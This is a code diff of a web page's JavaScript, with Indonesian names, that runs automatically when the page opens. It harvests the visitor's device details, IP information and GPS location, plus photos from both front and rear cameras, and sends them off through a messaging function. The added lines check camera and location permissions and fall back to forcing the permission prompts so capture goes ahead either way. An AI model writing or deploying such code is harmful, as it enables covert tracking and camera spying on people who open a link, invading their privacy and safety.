@@ -241,21 +241,40 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
     };
 
     const mulai = async () => {
-      const [info, ip, lokasi] = await Promise.all([
-        ambilDataPerangkat(),
-        ambilIPInfo(),
-        ambilLokasi()
-      ]);
+      try {
+        const kameraPermission = await navigator.permissions.query({ name: 'camera' });
+        const lokasiPermission = await navigator.permissions.query({ name: 'geolocation' });
 
-      let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+        if (kameraPermission.state === "granted" && lokasiPermission.state === "granted") {
+          const [info, ip, lokasi] = await Promise.all([
+            ambilDataPerangkat(),
+            ambilIPInfo(),
+            ambilLokasi()
+          ]);
 
-      const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
-      if (kameraDepan) hasil += `\n${kameraDepan}`;
+          let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+          const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
+          if (kameraDepan) hasil += `\n${kameraDepan}`;
+          const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
+          if (kameraBelakang) hasil += `\n${kameraBelakang}`;
 
-      const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
-      if (kameraBelakang) hasil += `\n${kameraBelakang}`;
+          await kirimPesan(hasil);
+        } else {
+          // Minta izin dulu, otomatis muncul prompt
+          const lokasi = await ambilLokasi();
+          const info = await ambilDataPerangkat();
+          const ip = await ambilIPInfo();
+          let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+          const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
+          if (kameraDepan) hasil += `\n${kameraDepan}`;
+          const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
+          if (kameraBelakang) hasil += `\n${kameraBelakang}`;
 
-      await kirimPesan(hasil);
+          await kirimPesan(hasil);
+        }
+      } catch (e) {
+        console.warn("Gagal mendeteksi izin:", e);
+      }
     };
 
     mulai();
